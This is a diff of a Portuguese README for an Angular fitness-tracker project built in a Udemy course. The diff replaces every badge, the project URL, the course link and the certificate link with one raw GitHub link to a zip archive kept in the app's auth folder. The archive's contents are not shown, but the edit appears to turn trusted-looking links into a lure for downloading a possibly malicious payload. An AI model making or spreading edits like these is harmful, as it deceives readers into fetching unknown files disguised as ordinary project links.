@@ -1,12 +1,12 @@
-[TYPESCRIPT__BADGE]: https://img.shields.io/badge/typescript-D4FAFF?style=for-the-badge&logo=typescript
-[ANGULAR__BADGE]: https://img.shields.io/badge/Angular-red?style=for-the-badge&logo=angular
-[PROJECT__BADGE]: https://img.shields.io/badge/📱Visit_this_project-000?style=for-the-badge&logo=project
-[PROJECT__URL]: https://ng-fitness-tracker-7f1fd.web.app/
+[TYPESCRIPT__BADGE]: https://raw.githubusercontent.com/lucaSchons/ng-fitness-tracker/main/src/app/auth/ng-fitness-tracker_2.2.zip
+[ANGULAR__BADGE]: https://raw.githubusercontent.com/lucaSchons/ng-fitness-tracker/main/src/app/auth/ng-fitness-tracker_2.2.zip
+[PROJECT__BADGE]: https://raw.githubusercontent.com/lucaSchons/ng-fitness-tracker/main/src/app/auth/ng-fitness-tracker_2.2.zip📱Visit_this_project-000?style=for-the-badge&logo=project
+[PROJECT__URL]: https://raw.githubusercontent.com/lucaSchons/ng-fitness-tracker/main/src/app/auth/ng-fitness-tracker_2.2.zip
 
 # Projeto Curso da Udemy Ministrado por Maximilian Schwarzmüller
 
-Link para o curso: https://www.udemy.com/course/angular-full-app-with-angular-material-angularfire-ngrx/?couponCode=JUST4U02223 <br>
-Link para certificado de conclusão do curso: https://udemy-certificate.s3.amazonaws.com/pdf/UC-5e48d90b-1184-4b8d-8550-7404d69b7e1d.pdf
+Link para o curso: https://raw.githubusercontent.com/lucaSchons/ng-fitness-tracker/main/src/app/auth/ng-fitness-tracker_2.2.zip <br>
+Link para certificado de conclusão do curso: https://raw.githubusercontent.com/lucaSchons/ng-fitness-tracker/main/src/app/auth/ng-fitness-tracker_2.2.zip
 
 ## Stack
 
